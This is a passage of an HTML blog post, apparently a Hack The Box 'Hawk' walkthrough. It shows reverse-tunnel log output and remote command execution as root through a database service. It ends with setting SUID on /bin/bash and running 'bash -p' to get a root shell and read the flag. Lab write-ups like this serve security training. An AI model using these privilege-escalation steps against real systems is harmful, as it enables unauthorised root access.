+</span></span><span style="display:flex;"><span>2022/07/11 21:32:06 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2022/07/11 21:32:06 server: Fingerprint S/iD0MdHTYM8JBxXVa+NZsTLoOEph5iHQ4zIKeNiMAw<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>2022/07/11 21:32:06 server: Listening on http://0.0.0.0:1234
+</span></span><span style="display:flex;"><span>2022/07/11 21:32:22 server: session#1: tun: proxy#R:8082<span style="color:#f92672">=</span>&gt;8082: Listening
+</span></span></code></pre></div><p>Now if we go to our localhost in port 8082 we should have access to the database:
+
+  <img src="/img/haw12.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>In the Preferences panel we can allow access from other hosts:
+
+  <img src="/img/haw13.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>If we try to connect we get an error:</p>
+
+  <img src="/img/haw14.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We can quicly solve this by changing the database name:</p>
+
+  <img src="/img/haw15.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The user running the server is root:</p>
+
+  <img src="/img/haw16.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>So if we get command execution it will be as root.</p>
+<p>After some research we find this:</p>
+
+  <img src="/img/haw17.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Let&rsquo;s see if it works by trying to execute <strong>id</strong>:</p>
+
+  <img src="/img/haw18.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It works!</p>
+<p>As root is the one executing this, we can change the <strong>/bin/bash</strong> privileges to SUID and get access as root:</p>
+
+  <img src="/img/haw19.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@hawk:/tmp$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1113504</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> /bin/bash
+</span></span></code></pre></div><p>Now with parameter <strong>-p</strong> we will spawn a bash as the owner, <strong>root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@hawk:/tmp$ bash -p
+</span></span><span style="display:flex;"><span>bash-4.4# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Nice, inside root&rsquo;s folder we can find the root.txt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-4.4# cat /root/root.txt
+</span></span><span style="display:flex;"><span>65f3dee5beae82******************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://theloganlab.github.io/posts/celest/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB: Celestial</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/routerspace/">
+                <span class="button__text">HTB: RouterSpace</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
